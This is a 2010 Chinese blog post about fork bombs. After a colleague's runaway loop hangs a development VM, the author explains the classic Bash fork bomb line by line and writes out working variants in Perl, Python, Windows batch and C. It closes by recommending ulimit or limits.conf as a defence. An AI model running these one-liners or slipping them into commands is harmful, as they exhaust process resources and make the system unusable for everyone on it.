---
layout: post
status: publish
published: true
title: 又见Bash炸弹
author:
  display_name: admin
  login: admin
  email: combbs@gmail.com
  url: http://seaprince.cn/
author_login: admin
author_email: combbs@gmail.com
author_url: http://seaprince.cn/
wordpress_id: 531
wordpress_url: http://blog.eaxi.com/?p=531
date: !binary |-
  MjAxMC0wOS0yNyAxMDozOToxOSArMDgwMA==
date_gmt: !binary |-
  MjAxMC0wOS0yNyAwMjozOToxOSArMDgwMA==
categories:
- 服务器
- C&#47;C++
tags: []
comments: []
---
<p>
今天一位同事在编码时不小心，忘记给循环加break。导致开发机（虚拟机）负载过高而无响应。ping值忽高忽低，ssh连不上，mysql连接超时。<br />
这不禁让人想起大名鼎鼎的Bash炸弹：</p>
<p>:(){ :|:& };:</p>
<p>在Bash中，冒号（:）是可以做为函数名的，所以这个炸弹也就很容易理解了：<br />
1. 定义一个函数<br />
2. 函数体中，递归调用此函数，并把输出重定向到管道。<br />
3. Bash中，函数调用是会启动新进程的，而管道后端又启动一个进程。<br />
4. 管道启动的新进程又会继续递归启用管道、启动新进程。<br />
5. & 符号把任务置于后台运行，避免终端交互。<br />
6. 连锁反应会继续，直接到达内核资源限制。若无限制，则直接会把服务器拖死。</p>
<p>Perl 版本炸弹</p>
<p>perl -e "fork while fork" &</p>
<p>Python版本炸弹</p>
<p>import os<br />
  while(1):<br />
      os.fork()</p>
<p>Windows XP 批处理</p>
<p>:bomb<br />
start %0<br />
goto bomb</p>
<p>C语言版本 </p>
<p>int main() { while(1) fork(); } </p>
<p>如何防范？</p>
<p>通过限制用户对资源的占用来防止。因为此类炸弹是用耗尽系统资源来达到攻击目的的。Linux的限制方法有：<br />
ulimit 命令 或者 &#47;etc&#47;security&#47;limits.conf</p>
